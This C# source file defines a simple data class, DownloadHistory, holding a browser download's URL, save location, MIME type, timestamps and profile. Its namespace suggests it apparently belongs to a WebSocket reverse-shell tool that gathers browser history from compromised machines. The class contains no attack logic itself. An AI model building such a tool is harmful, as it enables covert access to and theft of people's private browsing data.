using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.model.broswer
{
    internal class DownloadHistory
    {

        public string? DownloadUrl { get; set; }
        public string? DownloadLocation { get; set; }
        public string? MimeTyoe { get; set; }
        public string? StartTime { get; set; }
        public string? EndTime { get; set; }
        public string? BrowserProfile { get; set; }


        public DownloadHistory(string? DownloadUrl, string? DownloadLocation,
            string? MimeTyoe, string? StartTime, string? EndTime, string? BrowserProfile) {
        
            this.DownloadUrl = DownloadUrl;
            this.DownloadLocation = DownloadLocation;
            this.BrowserProfile = BrowserProfile;
            this.MimeTyoe = MimeTyoe;
            this.StartTime = StartTime;
            this.EndTime = EndTime;

        }    

    }
}
